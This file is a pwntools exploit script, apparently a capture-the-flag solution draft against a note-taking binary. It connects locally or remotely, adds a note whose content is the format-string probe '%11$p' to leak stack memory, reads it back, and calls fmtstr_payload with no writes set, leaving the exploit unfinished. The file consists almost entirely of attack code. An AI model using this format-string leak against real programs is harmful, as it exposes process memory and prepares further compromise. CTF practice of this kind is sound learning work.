from tkinter import W
from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]

elf = "./main_patched"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b* main+555
"""

conn = ""
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def add_note(index, title, content):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b': ', index)
    io.sendlineafter(b': ', title)
    io.sendlineafter(b': ', content)

def read_note(index):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', index)
    
    io.recvuntil(b'=====\n')
    return io.recvline(False)



add_note(b'0', b'a', b'%11$p')

print(read_note(b'0'))

fmtstr_payload(8, {})

# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
